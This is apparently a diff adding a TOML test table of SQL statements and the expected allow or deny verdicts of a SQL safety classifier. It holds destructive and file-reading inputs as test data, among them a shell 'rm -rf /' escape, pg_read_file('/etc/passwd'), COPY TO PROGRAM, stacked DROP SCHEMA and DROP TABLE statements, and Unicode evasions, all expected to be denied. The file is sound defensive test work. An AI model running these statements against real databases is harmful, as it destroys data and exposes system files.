+id = "P29"
+sql = "\\! rm -rf /"
+classifier = { verdict = "deny", reasons = ["LexError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P30"
+sql = "SELECT 1 FROM t GROUP BY CUBE ROLLUP"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "ParseError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P31"
+sql = "SELECT pg_create_physical_replication_slot('rs1')"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P32"
+sql = "SELECT pg_switch_wal()"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P33"
+sql = "SELECT lo_export(16384, '/tmp/x')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P34"
+sql = "SELECT pg_stat_reset()"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P35"
+sql = "SELECT pg_current_xact_id()"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "XidConsume"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P36"
+sql = "SELECT dblink_exec('dbname=x', 'INSERT INTO t VALUES (1)')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "ExternalIo", "ExternalNetwork", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P37"
+sql = "SELECT nextval('s')"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "SequenceAdvance"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P38"
+sql = "SELECT query_to_xml('DELETE FROM t RETURNING *', true, true, '')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+
+[[row]]
+id = "P39"
+sql = "SELECT 1"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "privilege_only"
+anchor = "alg/13 SQL-SAFE-06 (catalogue example; classified only)"
+note = "n/a: a principal row (VALID UNTIL, trust hba), nothing to classify"
+
+[[row]]
+id = "SAFE02-1"
+sql = "SELECT * FROM t"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-2"
+sql = "WITH d AS (DELETE FROM t RETURNING *) SELECT * FROM d"
+classifier = { verdict = "deny", reasons = ["DataModifyingCte", "Destructive", "WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-3"
+sql = "SELECT * INTO x FROM t"
+classifier = { verdict = "deny", reasons = ["SchemaChange", "WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-4"
+sql = "EXPLAIN SELECT 1"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-4"
+sql = "EXPLAIN ANALYZE DELETE FROM t"
+classifier = { verdict = "deny", reasons = ["Destructive", "WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-4"
+sql = "EXPLAIN (ANALYZE off) DELETE FROM t"
+classifier = { verdict = "deny", reasons = ["WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-5"
+sql = "SELECT pg_terminate_backend(123)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-6"
+sql = "SELECT nextval('s')"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "SequenceAdvance"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-7"
+sql = "SELECT * FROM t FOR UPDATE"
+classifier = { verdict = "deny", reasons = ["LockingClause"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-8"
+sql = "SET TRANSACTION READ WRITE"
+classifier = { verdict = "deny", reasons = ["SessionState", "SetNotAllowlisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-8"
+sql = "SELECT set_config('transaction_read_only','off',true)"
+classifier = { verdict = "deny", reasons = ["AdminControl", "FnDenylisted", "SessionState"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-9"
+sql = "COMMIT"
+classifier = { verdict = "deny", reasons = ["TxnControl"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-9"
+sql = "SELECT 1; DELETE FROM t"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-9"
+sql = "COMMIT; DROP SCHEMA public CASCADE;"
+classifier = { verdict = "deny", reasons = ["MultiStatement"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-10"
+sql = "COPY t TO STDOUT"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-10"
+sql = "COPY t TO PROGRAM 'x'"
+classifier = { verdict = "deny", reasons = ["ProcessExec"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-11"
+sql = "SELECT dblink_exec('host=x', 'DROP TABLE t')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "ExternalIo", "ExternalNetwork", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-12"
+sql = "SELECT query_to_xml('select 1', true, true, '')"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-13"
+sql = "DO $$BEGIN END$$"
+classifier = { verdict = "deny", reasons = ["DynamicSql", "EffectsUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-13"
+sql = "CALL p()"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown", "ProceduralCode", "RoutineCall"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-14"
+sql = "SELECT 1 ### 2"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "OperatorUnknown"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-15"
+sql = "SELECT my_stable_sql_fn(x) FROM t"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-17"
+sql = "SELECT * FROM pg_read_file('/etc/passwd')"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-17"
+sql = "SELECT x FROM t, LATERAL pg_catalog.pg_ls_dir('.') d"
+classifier = { verdict = "deny", reasons = ["ExternalFile", "ExternalIo", "FnDenylisted"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-18"
+sql = "SELECT txid_current()"
+classifier = { verdict = "deny", reasons = ["FnDenylisted", "XidConsume"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-19"
+sql = "LISTEN ch"
+classifier = { verdict = "deny", reasons = ["SessionState"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-19"
+sql = "DECLARE c CURSOR WITH HOLD FOR SELECT 1"
+classifier = { verdict = "deny", reasons = ["SessionState"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-20"
+sql = "SELEC 1"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "ParseError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-21"
+sql = "SELECT PG_READ_F\u0130LE('/x')"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "FnUnknown"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-33"
+sql = "SELECT \"DELETE\" FROM t"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-34"
+sql = "SELECT 1;;"
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table"
+
+[[row]]
+id = "SAFE02-15"
+sql = "SELECT my_stable_sql_fn(x) FROM t"
+allowlist = ["my_stable_sql_fn"]
+classifier = { verdict = "allow", reasons = [] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-02 test table (the profile allowlist, D-009)"
+
+[[row]]
+id = "X1"
+sql = "SELECT 1 /* never closed"
+classifier = { verdict = "deny", reasons = ["LexError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
+
+[[row]]
+id = "X1"
+sql = "SELECT $a$ x $b$"
+classifier = { verdict = "deny", reasons = ["AmbiguousBoundary", "LexError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
+
+[[row]]
+id = "X2"
+sql = "S\u0415LECT 1"
+classifier = { verdict = "deny", reasons = ["EffectsUnknown", "ParseError"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
+
+[[row]]
+id = "X3"
+sql = "SELECT 1\u0000; DROP TABLE t"
+classifier = { verdict = "deny", reasons = ["LexError", "MultiStatement"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
+
+[[row]]
+id = "X4"
+sql = "SELECT ((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((1))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))"
+classifier = { verdict = "deny", reasons = ["TooComplex"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
+
+[[row]]
+id = "X5"
+sql = "SELECT * FROM (SELECT (WITH d AS (DELETE FROM t RETURNING *) SELECT 1)) s"
+classifier = { verdict = "deny", reasons = ["DataModifyingCte", "Destructive", "WriteData"] }
+server_off = []
+accounts = []
+kind = "server_blocked"
+anchor = "alg/13 SQL-SAFE-06 cross-cutting"
